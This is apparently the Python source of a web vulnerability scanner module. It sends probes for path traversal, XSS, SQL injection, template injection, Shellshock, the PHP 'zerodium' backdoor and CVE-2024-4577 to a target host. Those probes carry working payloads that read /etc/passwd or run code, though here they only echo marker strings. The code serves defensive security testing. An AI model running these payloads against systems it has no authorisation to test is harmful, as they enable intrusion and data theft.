import re as _re
import time
import requests
from urllib.parse import quote

from .findings import Finding, Severity, probe_result, probe_error


class _InjectionTestBase:
  """Shared execution engine for injection-style web tests."""

  def _run_injection_test(self, target, port, *, params, payloads, check_fn,
                          finding_factory, max_findings=3):
    """
    Iterate params x payloads, call check_fn(response, needle) for each,
    create findings via finding_factory(param, payload, response, url).
    """
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"
    findings = []

    for param in params:
      if len(findings) >= max_findings:
        break
      for payload, needle in payloads:
        try:
          url = f"{base_url}?{param}={payload}"
          resp = requests.get(url, timeout=3, verify=False)
          if check_fn(resp, needle):
            findings.append(finding_factory(param, payload, resp, url))
            break  # Found for this param, next param
        except Exception:
          pass

    return findings


class _WebInjectionMixin(_InjectionTestBase):
  """
  Non-destructive probes for path traversal, reflected XSS,
  and SQL injection (OWASP WSTG-INPV).
  """

  def _web_test_path_traversal(self, target, port):
    """
    Attempt path traversal via URL path and query parameters with encoding variants.

    Parameters
    ----------
    target : str
      Hostname or IP address.
    port : int
      Web port to probe.

    Returns
    -------
    dict
      Structured findings.
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    unix_needles = ("root:x:", "root:*:", "daemon:")
    win_needles = ("[boot loader]", "[operating systems]", "[fonts]")

    # --- 1. Path-based traversal ---
    path_payloads = [
      "/../../../../etc/passwd",
      "/..%2f..%2f..%2f..%2fetc/passwd",
      "/....//....//....//....//etc/passwd",
      "/../../../../windows/win.ini",
    ]
    for payload_path in path_payloads:
      if len(findings_list) >= 3:
        break
      try:
        url = base_url.rstrip("/") + payload_path
        resp = requests.get(url, timeout=2, verify=False)
        if any(n in resp.text for n in unix_needles):
          findings_list.append(Finding(
            severity=Severity.CRITICAL,
            title=f"Path traversal: /etc/passwd via path",
            description=f"Server returned /etc/passwd content via path traversal.",
            evidence=f"URL: {url}, body contains passwd markers",
            remediation="Sanitize path components; use a web application firewall.",
            owasp_id="A01:2021",
            cwe_id="CWE-22",
            confidence="certain",
          ))
          break
        if any(n in resp.text for n in win_needles):
          findings_list.append(Finding(
            severity=Severity.CRITICAL,
            title=f"Path traversal: win.ini via path",
            description=f"Server returned Windows system file content.",
            evidence=f"URL: {url}, body contains win.ini markers",
            remediation="Sanitize path components.",
            owasp_id="A01:2021",
            cwe_id="CWE-22",
            confidence="certain",
          ))
          break
      except Exception:
        pass

    # --- 2. Query parameter traversal ---
    params = ["file", "path", "page", "doc", "template", "include", "name"]
    payloads_qs = [
      ("../../../../etc/passwd", unix_needles),
      ("..%2f..%2f..%2f..%2fetc/passwd", unix_needles),
      ("..%252f..%252f..%252f..%252fetc/passwd", unix_needles),  # double-encoded
      ("..\\..\\..\\..\\windows\\win.ini", win_needles),
    ]
    for param in params:
      if len(findings_list) >= 3:
        break
      for payload, needles in payloads_qs:
        try:
          url = f"{base_url}?{param}={payload}"
          resp = requests.get(url, timeout=2, verify=False)
          if any(n in resp.text for n in needles):
            findings_list.append(Finding(
              severity=Severity.CRITICAL,
              title=f"Path traversal via ?{param}= parameter",
              description=f"Parameter '{param}' allows reading system files.",
              evidence=f"URL: {url}",
              remediation=f"Validate and sanitize the '{param}' parameter.",
              owasp_id="A01:2021",
              cwe_id="CWE-22",
              confidence="certain",
            ))
            break
        except Exception:
          pass

    return probe_result(findings=findings_list)


  def _web_test_xss(self, target, port):
    """
    Probe reflected XSS via URL path injection and query parameters.

    Tests multiple payloads across common parameter names.

    Parameters
    ----------
    target : str
      Hostname or IP address.
    port : int
      Web port to probe.

    Returns
    -------
    dict
      Structured findings.
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    xss_payloads = [
      ('<img src=x onerror=alert(1)>', 'onerror=alert'),
      ('<svg onload=alert(1)>', 'onload=alert'),
      ('<script>alert(1)</script>', '<script>alert(1)'),
      ('" onfocus="alert(1)" autofocus="', 'onfocus='),
    ]

    # --- 1. Path injection ---
    for payload, needle in xss_payloads:
      if findings_list:
        break
      try:
        url = base_url.rstrip("/") + f"/{payload}"
        resp = requests.get(url, timeout=3, verify=False)
        if needle in resp.text:
          findings_list.append(Finding(
            severity=Severity.HIGH,
            title=f"Reflected XSS via URL path",
            description=f"Payload '{payload[:40]}' reflected in response body.",
            evidence=f"URL: {url}, needle '{needle}' found in body",
            remediation="Encode output; implement Content-Security-Policy.",
            owasp_id="A03:2021",
            cwe_id="CWE-79",
            confidence="certain",
          ))
          break
      except Exception:
        pass

    # --- 2. Query parameter injection ---
    params = ["q", "search", "id", "name", "page", "input", "text"]

    def _xss_check(resp, needle):
      return needle in resp.text

    def _xss_finding(param, payload, resp, url):
      return Finding(
        severity=Severity.HIGH,
        title=f"Reflected XSS via ?{param}= parameter",
        description=f"Payload '{payload[:40]}' reflected unescaped via '{param}'.",
        evidence=f"URL: {url}",
        remediation=f"HTML-encode the '{param}' parameter in output.",
        owasp_id="A03:2021",
        cwe_id="CWE-79",
        confidence="certain",
      )

    findings_list += self._run_injection_test(
      target, port,
      params=params,
      payloads=xss_payloads,
      check_fn=_xss_check,
      finding_factory=_xss_finding,
      max_findings=3 - len(findings_list),
    )

    return probe_result(findings=findings_list)


  def _web_test_sql_injection(self, target, port):
    """
    Multi-technique SQL injection probe: error-based, boolean-blind, time-based.

    Parameters
    ----------
    target : str
      Hostname or IP address.
    port : int
      Web port to probe.

    Returns
    -------
    dict
      Structured findings.
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    sql_error_keywords = [
      "sql", "syntax", "mysql", "psql", "postgres", "sqlite", "ora-",
      "microsoft ole db", "odbc", "unclosed quotation", "unterminated",
      "you have an error in your sql",
    ]
    params = ["id", "page", "q", "user", "item", "cat"]

    # --- 1. Error-based ---
    error_payloads = [
      ("'", None),
      ("1'--", None),
      ("1 UNION SELECT NULL--", None),
      ("1' OR '1'='1", None),
    ]

    def _sqli_error_check(resp, _needle):
      body = resp.text.lower()
      return any(kw in body for kw in sql_error_keywords)

    def _sqli_error_finding(param, payload, resp, url):
      return Finding(
        severity=Severity.HIGH,
        title=f"SQL injection (error-based) via ?{param}=",
        description=f"SQL error keywords in response to payload '{payload}'.",
        evidence=f"URL: {url}",
        remediation=f"Use parameterized queries for '{param}'.",
        owasp_id="A03:2021",
        cwe_id="CWE-89",
        confidence="firm",
      )

    findings_list += self._run_injection_test(
      target, port,
      params=params,
      payloads=error_payloads,
      check_fn=_sqli_error_check,
      finding_factory=_sqli_error_finding,
      max_findings=3,
    )

    # --- 2. Boolean-blind (only if error-based found nothing) ---
    if not findings_list:
      for param in params[:3]:
        if findings_list:
          break
        try:
          url_true = f"{base_url}?{param}=1 AND 1=1"
          url_false = f"{base_url}?{param}=1 AND 1=2"
          url_base = f"{base_url}?{param}=1"

          resp_base = requests.get(url_base, timeout=3, verify=False)
          resp_true = requests.get(url_true, timeout=3, verify=False)
          resp_false = requests.get(url_false, timeout=3, verify=False)

          # Baseline should match true, differ from false
          if (resp_base.status_code == resp_true.status_code and
              abs(len(resp_base.text) - len(resp_true.text)) < 50 and
              abs(len(resp_true.text) - len(resp_false.text)) > 50):
            findings_list.append(Finding(
              severity=Severity.HIGH,
              title=f"SQL injection (boolean-blind) via ?{param}=",
              description=f"Response differs between AND 1=1 and AND 1=2.",
              evidence=f"Base size={len(resp_base.text)}, true={len(resp_true.text)}, "
                       f"false={len(resp_false.text)}",
              remediation=f"Use parameterized queries for '{param}'.",
              owasp_id="A03:2021",
              cwe_id="CWE-89",
              confidence="tentative",
            ))
        except Exception:
          pass

    # --- 3. Time-based (last resort, max 2 params) ---
    if not findings_list:
      for param in params[:2]:
        if findings_list:
          break
        try:
          url_sleep = f"{base_url}?{param}=" + quote("' AND SLEEP(2)--")
          start = time.time()
          requests.get(url_sleep, timeout=5, verify=False)
          elapsed = time.time() - start
          if elapsed >= 2.0:
            findings_list.append(Finding(
              severity=Severity.HIGH,
              title=f"SQL injection (time-based) via ?{param}=",
              description=f"SLEEP(2) caused {elapsed:.1f}s delay.",
              evidence=f"URL: {url_sleep}, elapsed={elapsed:.1f}s",
              remediation=f"Use parameterized queries for '{param}'.",
              owasp_id="A03:2021",
              cwe_id="CWE-89",
              confidence="firm",
            ))
        except Exception:
          pass

    return probe_result(findings=findings_list)


  # ── SSTI (Server-Side Template Injection) ────────────────────────────

  def _web_test_ssti(self, target, port):
    """
    Probe for Server-Side Template Injection via safe math expressions.

    Tests ``{{7*7}}`` (Jinja2/Twig), ``{{7*'7'}}`` (Jinja2 string mult),
    ``${7*7}`` (Freemarker/Mako) across common parameter names and URL path.
    Detection: response contains the *evaluated* result but NOT the raw payload
    (which would indicate XSS reflection, not template evaluation).

    Parameters
    ----------
    target : str
    port : int

    Returns
    -------
    dict
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    ssti_payloads = [
      ("{{7*7}}", "49", "Jinja2/Twig"),
      ("{{7*'7'}}", "7777777", "Jinja2"),
      ("${7*7}", "49", "Freemarker/Mako"),
      ("<%= 7*7 %>", "49", "ERB/EJS"),
    ]
    params = ["name", "q", "search", "input", "text", "template", "page", "id"]

    # Baseline: fetch the page without payloads to filter false positives
    # (e.g. "49" naturally appears in many pages)
    baseline_text = ""
    try:
      baseline_resp = requests.get(base_url, timeout=3, verify=False)
      baseline_text = baseline_resp.text
    except Exception:
      pass

    # --- 1. Query parameter injection ---
    for param in params:
      if len(findings_list) >= 2:
        break
      for payload, expected, engine in ssti_payloads:
        # Skip if expected result already exists in baseline page
        if expected in baseline_text:
          continue
        try:
          url = f"{base_url}?{param}={quote(payload)}"
          resp = requests.get(url, timeout=3, verify=False)
          if expected in resp.text and payload not in resp.text:
            findings_list.append(Finding(
              severity=Severity.CRITICAL,
              title=f"SSTI ({engine}) via ?{param}= parameter",
              description=f"Template expression '{payload}' was evaluated server-side "
                          f"to '{expected}', confirming {engine} SSTI. "
                          "This leads to Remote Code Execution.",
              evidence=f"URL: {url}, response contains '{expected}' but not raw payload",
              remediation="Never pass user input directly into template rendering. "
                          "Use sandboxed template environments.",
              owasp_id="A03:2021",
              cwe_id="CWE-1336",
              confidence="certain",
            ))
            break
        except Exception:
          pass

    # --- 2. Path-based injection ---
    if not findings_list:
      for payload, expected, engine in ssti_payloads[:2]:
        if expected in baseline_text:
          continue
        try:
          url = base_url.rstrip("/") + "/" + quote(payload)
          resp = requests.get(url, timeout=3, verify=False)
          if expected in resp.text and payload not in resp.text:
            findings_list.append(Finding(
              severity=Severity.CRITICAL,
              title=f"SSTI ({engine}) via URL path",
              description=f"Template expression '{payload}' evaluated in URL path.",
              evidence=f"URL: {url}, response contains '{expected}'",
              remediation="Never pass user input directly into template rendering.",
              owasp_id="A03:2021",
              cwe_id="CWE-1336",
              confidence="certain",
            ))
            break
        except Exception:
          pass

    return probe_result(findings=findings_list)


  # ── Shellshock (CVE-2014-6271) ──────────────────────────────────────

  def _web_test_shellshock(self, target, port):
    """
    Test for CVE-2014-6271 (Shellshock) by sending bash function definitions
    in HTTP headers to potential CGI endpoints.

    Safe detection: uses echo-based payload that produces a unique marker
    in the response body if bash evaluates the injected function.

    Parameters
    ----------
    target : str
    port : int

    Returns
    -------
    dict
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    marker = "REDMESH_SHELLSHOCK_DETECT"
    shellshock_payload = f'() {{ :; }}; echo; echo {marker}'

    cgi_paths = [
      "/cgi-bin/test.cgi",
      "/cgi-bin/status",
      "/cgi-bin/test",
      "/cgi-bin/test-cgi",
      "/cgi-bin/printenv",
      "/cgi-bin/env.cgi",
      "/cgi-bin/",
      "/victim.cgi",
      "/safe.cgi",
    ]

    for cgi_path in cgi_paths:
      if findings_list:
        break
      url = base_url.rstrip("/") + cgi_path
      try:
        resp = requests.get(
          url,
          headers={
            "User-Agent": shellshock_payload,
            "Referer": shellshock_payload,
          },
          timeout=4,
          verify=False,
        )
        if marker in resp.text:
          findings_list.append(Finding(
            severity=Severity.CRITICAL,
            title=f"CVE-2014-6271: Shellshock RCE via {cgi_path}",
            description="Bash function injection via HTTP headers is evaluated "
                        "by the CGI handler, enabling unauthenticated Remote "
                        "Code Execution.",
            evidence=f"GET {url} with shellshock payload in User-Agent "
                     f"returned marker '{marker}' in response body.",
            remediation="Upgrade bash to a patched version (>= 4.3 patch 25); "
                        "remove unnecessary CGI scripts.",
            owasp_id="A06:2021",
            cwe_id="CWE-78",
            confidence="certain",
          ))
      except Exception:
        pass

    return probe_result(findings=findings_list)


  # ── PHP CGI argument injection + backdoor ───────────────────────────

  def _web_test_php_cgi(self, target, port):
    """
    Test for PHP-CGI vulnerabilities:

    1. PHP 8.1.0-dev supply-chain backdoor (zerodium ``User-Agentt`` header).
    2. CVE-2024-4577: argument injection via soft-hyphen (``%AD``) bypass.
    3. PHP-CGI source disclosure via ``-s`` flag injection.

    Parameters
    ----------
    target : str
    port : int

    Returns
    -------
    dict
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    # --- 1. PHP 8.1.0-dev backdoor (User-Agentt header) ---
    try:
      resp = requests.get(
        base_url,
        headers={"User-Agentt": "zerodiumsystem('echo REDMESH_PHP_BACKDOOR');"},
        timeout=3,
        verify=False,
      )
      if "REDMESH_PHP_BACKDOOR" in resp.text:
        findings_list.append(Finding(
          severity=Severity.CRITICAL,
          title="PHP 8.1.0-dev backdoor: zerodiumsystem RCE",
          description="The PHP binary contains a supply-chain backdoor that "
                      "executes arbitrary code from the 'User-Agentt' (double-t) header. "
                      "This enables unauthenticated Remote Code Execution.",
          evidence=f"GET {base_url} with User-Agentt: zerodiumsystem(echo ...) "
                   "returned the echoed marker in response body.",
          remediation="Replace the PHP binary immediately — this is a "
                      "compromised build. Use an official PHP release.",
          owasp_id="A08:2021",
          cwe_id="CWE-506",
          confidence="certain",
        ))
    except Exception:
      pass

    # --- 2. CVE-2024-4577: PHP-CGI argument injection ---
    php_cgi_paths = ["/", "/index.php"]
    for path in php_cgi_paths:
      if any("CVE-2024-4577" in f.title for f in findings_list):
        break
      try:
        test_url = (
          base_url.rstrip("/") + path +
          "?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
        )
        resp = requests.post(
          test_url,
          data="<?php echo 'REDMESH_PHPCGI_TEST'; ?>",
          headers={"Content-Type": "application/x-www-form-urlencoded"},
          timeout=3,
          verify=False,
        )
        # Guard: auto_prepend_file output appears at the very start of the
        # response when truly executed.  Debug/error pages (e.g. Laravel
        # Ignition) may *reflect* the POST body deep in HTML, causing FP.
        if "REDMESH_PHPCGI_TEST" in resp.text[:500]:
          findings_list.append(Finding(
            severity=Severity.CRITICAL,
            title="CVE-2024-4577: PHP-CGI argument injection RCE",
            description="PHP-CGI accepts soft-hyphen (%AD) as argument separator, "
                        "allowing injection of -d flags to override configuration "
                        "and execute arbitrary PHP code.",
            evidence=f"POST {test_url} with PHP echo payload was executed.",
            remediation="Upgrade PHP; migrate from CGI to PHP-FPM; "
                        "add URL rewrite rules to block %AD sequences.",
            owasp_id="A06:2021",
            cwe_id="CWE-78",
            confidence="certain",
          ))
      except Exception:
        pass

    # --- 3. PHP-CGI source disclosure via -s flag ---
    if not findings_list:
      try:
        resp = requests.get(base_url + "/?%ADs", timeout=3, verify=False)
        if "<code>" in resp.text and "<?php" in resp.text:
          findings_list.append(Finding(
            severity=Severity.HIGH,
            title="CVE-2024-4577: PHP-CGI source code disclosure",
            description="PHP-CGI -s flag can be injected via %AD soft-hyphen, "
                        "exposing PHP source code.",
            evidence=f"GET {base_url}/?%ADs returned PHP source code.",
            remediation="Upgrade PHP; use PHP-FPM instead of CGI.",
            owasp_id="A06:2021",
            cwe_id="CWE-200",
            confidence="certain",
          ))
      except Exception:
        pass

    return probe_result(findings=findings_list)


  # ── A04:2021 — IDOR indicators ──────────────────────────────────────

  _IDOR_PATHS = [
    ("/api/users/", "users"),
    ("/api/user/", "user"),
    ("/api/account/", "account"),
    ("/api/order/", "order"),
  ]
  _PII_PATTERNS = [
    _re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'),  # email
    _re.compile(r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b'),                     # phone
  ]

  def _web_test_idor_indicators(self, target, port):
    """
    Detect predictable/sequential resource IDs (IDOR indicators).

    Default severity is INFO.  Escalates to MEDIUM if PII-like patterns
    (emails, phone numbers) are found in the response.

    Parameters
    ----------
    target : str
    port : int

    Returns
    -------
    dict
    """
    findings_list = []
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"

    for path_prefix, resource in self._IDOR_PATHS:
      if findings_list:
        break
      try:
        url1 = f"{base_url.rstrip('/')}{path_prefix}1"
        url2 = f"{base_url.rstrip('/')}{path_prefix}2"
        resp1 = requests.get(url1, timeout=3, verify=False)
        resp2 = requests.get(url2, timeout=3, verify=False)

        if resp1.status_code != 200 or resp2.status_code != 200:
          continue
        if resp1.text == resp2.text:
          continue  # same content — likely generic page, not individual resources

        combined = resp1.text + resp2.text
        has_pii = any(p.search(combined) for p in self._PII_PATTERNS)

        if has_pii:
          findings_list.append(Finding(
            severity=Severity.MEDIUM,
            title=f"Sequential resource IDs with PII exposure: {path_prefix}",
            description=f"API endpoint {path_prefix}{{id}} returns different data for "
                        "sequential IDs and contains PII patterns (email/phone), "
                        "suggesting broken access control.",
            evidence=f"GET {url1} and {url2} both returned 200 with PII in body.",
            remediation="Use non-sequential identifiers (UUIDs); enforce per-user authorization.",
            owasp_id="A04:2021",
            cwe_id="CWE-639",
            confidence="firm",
          ))
        else:
          findings_list.append(Finding(
            severity=Severity.INFO,
            title=f"Sequential resource IDs detected: {path_prefix}",
            description=f"API endpoint {path_prefix}{{id}} returns distinct data for "
                        "sequential integer IDs. Manual IDOR verification recommended.",
            evidence=f"GET {url1} and {url2} both returned 200 with different bodies.",
            remediation="Consider using non-sequential identifiers (UUIDs).",
            owasp_id="A04:2021",
            cwe_id="CWE-639",
            confidence="tentative",
          ))
      except Exception:
        continue

    return probe_result(findings=findings_list)
